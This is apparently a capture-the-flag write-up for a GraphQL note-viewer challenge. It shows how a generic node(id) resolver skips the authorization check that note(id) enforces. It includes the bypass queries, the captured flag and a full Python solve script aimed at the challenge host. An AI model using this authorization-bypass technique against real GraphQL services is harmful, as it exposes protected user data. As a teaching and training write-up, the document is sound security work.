# web/vaultnote

## Overview

This challenge is a small note viewer backed by a GraphQL API at `/graphql`.
The frontend only shows public notes in the sidebar, but the API schema exposes
multiple ways to fetch note objects. The intended weakness is an authorization
check that exists on one resolver but is missing on another.

The important pieces are:

- The homepage JavaScript shows the app talks directly to `/graphql`.
- `query { notes { id title } }` returns visible note IDs: `1, 3, 4, 5`.
- `query { note(id: "2") { ... } }` returns `FORBIDDEN`, which strongly
  suggests note `2` exists but is protected.
- The GraphQL schema also exposes a generic `node(id)` resolver.
- `node(id: "2")` returns the secret note without enforcing the same access
  control.

So the core bug is a GraphQL auth bypass caused by inconsistent authorization
between resolvers.

## Exploit Chain

1. Open the homepage and inspect the client code.

   The page contains JavaScript that posts GraphQL queries to `/graphql`. That
   immediately tells us the challenge is API-driven and worth querying directly.

2. Enumerate the visible notes.

   Running:

   ```graphql
   query {
     notes {
       id
       title
     }
   }
   ```

   returns note IDs `1`, `3`, `4`, and `5`. Since the IDs are sequential except
   for `2`, that missing ID is the first high-value target.

3. Confirm that note `2` exists but is protected.

   Running:

   ```graphql
   query {
     note(id: "2") {
       id
       title
       content
     }
   }
   ```

   returns an error:

   ```text
   Access Denied: This note is classified.
   ```

   At this point we know the note is real, but the direct resolver blocks us.

4. Inspect the schema for alternate object access.

   GraphQL introspection shows the root query type exposes:

   - `notes`
   - `note(id: ID!)`
   - `me`
   - `node(id: ID!)`

   The presence of `node(id)` matters because many apps implement shared object
   fetchers there and forget to repeat resource-specific authorization checks.

5. Use `node(id)` to bypass the `note(id)` authorization check.

   Running:

   ```graphql
   query {
     node(id: "2") {
       __typename
       ... on Note {
         id
         title
         content
         author {
           username
           role
         }
       }
     }
   }
   ```

   returns the classified note, including the flag in `content`.

6. Extract the flag.

   The `content` field for note `2` is:

   ```text
   codegate2026{gR4phQL_1s_1nt3r4st1ng!!}
   ```

## Final Solve

```python
#!/usr/bin/env python3
import json
import re
import sys
import urllib.request


TARGET = "http://13.125.201.59/graphql"


def gql(query: str) -> dict:
    data = json.dumps({"query": query}).encode()
    req = urllib.request.Request(
        TARGET,
        data=data,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    with urllib.request.urlopen(req, timeout=10) as resp:
        return json.loads(resp.read().decode())


def main() -> int:
    query = """
    query {
      node(id: "2") {
        __typename
        ... on Note {
          id
          title
          content
          author {
            username
            role
          }
        }
      }
    }
    """

    result = gql(query)
    node = result.get("data", {}).get("node")
    if not node:
        print("failed to fetch note 2", file=sys.stderr)
        print(json.dumps(result, indent=2), file=sys.stderr)
        return 1

    print(f'type: {node.get("__typename")}')
    print(f'id: {node.get("id")}')
    print(f'title: {node.get("title")}')
    print(f'author: {node.get("author", {}).get("username")} ({node.get("author", {}).get("role")})')
    print(f'content: {node.get("content")}')

    match = re.search(r"codegate2026\{[^}]+\}", node.get("content", ""))
    if match:
        print(f"flag: {match.group(0)}")
        return 0

    print("flag not found in note content", file=sys.stderr)
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
```

Run the solve script:

```bash
python3 ./solve.py
```
